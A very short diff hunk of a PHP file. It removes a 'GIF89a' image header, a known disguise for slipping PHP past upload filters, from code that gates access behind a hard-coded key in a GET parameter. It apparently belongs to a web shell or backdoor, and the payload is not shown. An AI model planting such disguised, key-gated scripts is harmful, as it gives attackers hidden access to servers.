@@ -1,5 +1,3 @@
-;GIF89a
-
 <?php
 $access_key = 'nerd';
 if (!isset($_GET['neo']) || $_GET['neo'] !== $access_key) {
